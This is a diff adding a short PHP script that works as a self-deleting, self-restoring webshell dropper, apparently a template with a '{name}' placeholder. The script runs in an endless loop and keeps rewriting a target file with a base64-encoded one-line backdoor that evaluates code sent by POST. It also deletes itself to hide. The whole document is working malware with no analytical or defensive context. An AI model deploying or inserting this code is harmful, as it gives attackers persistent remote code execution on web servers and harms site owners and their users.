@@ -1,0 +1,20 @@
+<?php
+set_time_limit(0);
+ignore_user_abort(1);
+unlink(__FILE__);
+while(1){	
+	sleep(1);	
+	if(file_exists('index.php')){		
+		if(md5_file('{name}')==='912d7b3bbd5cf7405c9cc8f16156321b'){
+			
+		}else{
+			file_put_contents('{name}',base64_decode('PD9waHAgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFtzeHN4MjNdKSk7Pz4='));
+		}			
+	}else{
+		
+		if(file_exists('{name}')){
+			unlink('{name}');
+		}
+	}
+}
+?>
